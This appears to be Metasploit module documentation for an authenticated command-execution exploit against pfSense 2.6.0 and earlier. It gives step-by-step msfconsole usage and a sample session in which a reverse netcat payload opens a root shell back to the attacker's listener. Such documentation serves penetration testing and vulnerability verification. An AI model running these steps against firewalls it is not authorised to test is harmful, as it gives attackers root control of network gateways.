## Description

This module exploits a vulnerability in pfSense version 2.6.0 and before which allows an authenticated user to execute arbitrary operating system commands as root.

## Vulnerable Application

This module has been tested successfully on version 2.6.0-RELEASE

Installers:

* [pfSense 2.6.0-RELEASE](https://atxfiles.netgate.com/mirror/downloads/pfSense-CE-2.6.0-RELEASE-amd64.iso.gz)


## Verification Steps

1. Start `msfconsole`
2. Do: `use exploit/unix/http/pfsense_config_data_exec`
3. Do: `set RHOST [IP]`
4. Do: `set USERNAME [username]`
5. Do: `set PASSWORD [password]`
6. Do: `set LHOST [IP]`
7. Do: `exploit`

## Scenarios

### pfSense Community Edition 2.6.0-RELEASE

```
msf6 exploit(unix/http/pfsense_config_data_exec) > use exploit/unix/http/pfsense_config_data_exec 
[*] Using configured payload cmd/unix/reverse_netcat
msf6 exploit(unix/http/pfsense_config_data_exec) > set RHOST 1.1.1.1
RHOST => 1.1.1.1
msf6 exploit(unix/http/pfsense_config_data_exec) > set LHOST 2.2.2.2
LHOST => 2.2.2.2
msf6 exploit(unix/http/pfsense_config_data_exec) > exploit

[*] Started reverse TCP handler on 2.2.2.2:4444 
[+] The target is vulnerable.
[*] Command shell session 8 opened (2.2.2.2:4444 -> 1.1.1.1:21942) at 2023-03-26 02:10:48 +0300

id
uid=0(root) gid=0(wheel) groups=0(wheel)
whoami
root
```
